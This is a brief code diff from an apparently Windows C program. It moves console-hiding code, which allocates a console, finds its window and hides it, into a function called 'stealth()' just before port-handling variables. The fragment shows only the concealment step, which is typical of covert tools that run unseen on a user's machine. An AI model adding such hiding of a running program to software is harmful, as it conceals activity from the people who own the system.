@@ -2,10 +2,7 @@
 
 int main(int argc ,char *argv[])
 {
-	HWND stealth;
-	AllocConsole();
-	stealth=FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(stealth, 0);
+	stealth();
 
 	int portno;
 	char portchar[6];
